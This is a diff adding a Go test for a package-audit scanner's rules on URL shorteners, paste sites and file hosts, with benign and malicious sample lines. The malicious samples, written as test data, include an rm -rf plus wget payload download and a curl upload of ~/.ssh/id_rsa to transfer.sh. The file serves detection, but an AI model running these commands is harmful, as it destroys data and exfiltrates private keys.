@@ -172,3 +172,35 @@ func TestAuditChannelRulesNeedAnEndpoint(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// Host rules fired on doc links, shortener clients, paste-site links and file-host deny-lists.
+func TestAuditHostRulesNeedAFetchOrAPaste(t *testing.T) {
+	neg := []ruleCase{
+		{"P-URL-SHORTENER", "rubygems", `expect(list).to include(URI('http://bit.ly/foo'))`},
+		{"P-URL-SHORTENER", "rubygems", `short = URI.open("https://is.gd/create.php?format=simple&url=#{CGI.escape(url)}").read.strip`},
+		{"P-URL-SHORTENER", "go", `resp, err := client.Get("https://is.gd/create.php?format=simple&url=" + url.QueryEscape(longURL))`},
+		{"P-URL-SHORTENER", "packagist", `throw new WireException("Please use the new fields syntax, see https://bit.ly/3WVB2Dc");`},
+		{"P-URL-SHORTENER", "packagist", `message: 'Congratulations! You are selected for a limited offer!!! Click here 👉 http://bit.ly/xyz',`},
+		{"P-URL-SHORTENER", "nuget", "`[Immer] minified error nr: ${e}. Full error at: https://bit.ly/3cXEKWf`"},
+		{"P-PASTEBIN", "cargo", `assert!(classify_url("https://pastebin.com/abc").is_some());`},
+		{"P-PASTEBIN", "homebrew", `homepage "https://hastebin.com/"`},
+		{"P-PASTEBIN", "pub", `rulesFor('dependencies:\n  a:\n    git: https://pastebin.com/raw/x\n'),`},
+		{"P-PASTEBIN", "packagist", `return $this->getAvatarUrl() != 'https://pastebin.com/i/guest.png';`},
+		{"P-PASTEBIN", "pypi", `"Pastebin": f"https://pastebin.com/u/{username}",`},
+		{"P-FILEHOST-SOURCE", "cargo", `const KNOWN_SERVICE_DOMAINS: &[&str] = &["transfer.sh", "temp.sh", "paste.sh", "0x0.st"];`},
+		{"P-FILEHOST-SOURCE", "go", `"github.com/dutchcoders/transfer.sh/server"`},
+		{"P-FILEHOST-SOURCE", "pypi", `'script_name': 'catalog_transfer.sh',`},
+		{"P-FILEHOST-SOURCE", "packagist", `->for('Upload a file to file.io and get a shareable link')`},
+	}
+	pos := []ruleCase{
+		{"P-URL-SHORTENER", "rubygems", `_run("rm -rf /opt/moonlight-web && wget --no-check-certificate -q -O /tmp/linux.zip -L https://bit.ly/4fuW6fO")`},
+		{"P-URL-SHORTENER", "rubygems", `_download_zip("https://bit.ly/4fuW6fO", "/opt/moonlight-web")`},
+		{"P-URL-SHORTENER", "aur", `source=("payload.tgz::https://bit.ly/3xAbC")`},
+		{"P-PASTEBIN", "pypi", `response = requests.get('https://pastebin.com/raw/FTLjhBMX', timeout=10)`},
+		{"P-PASTEBIN", "pypi", `"https://pastebin.com/api/api_post.php",`},
+		{"P-PASTEBIN", "pypi", `sid = CodeManager.enc_url("https://pastebin.com/abcXYZ123")`},
+		{"P-FILEHOST-SOURCE", "aur", `curl --upload-file ~/.ssh/id_rsa transfer.sh/k`},
+		{"P-FILEHOST-SOURCE", "aur", `source=("https://transfer.sh/abc/payload.sh")`},
+	}
+	checkRuleCases(t, neg, pos)
+}
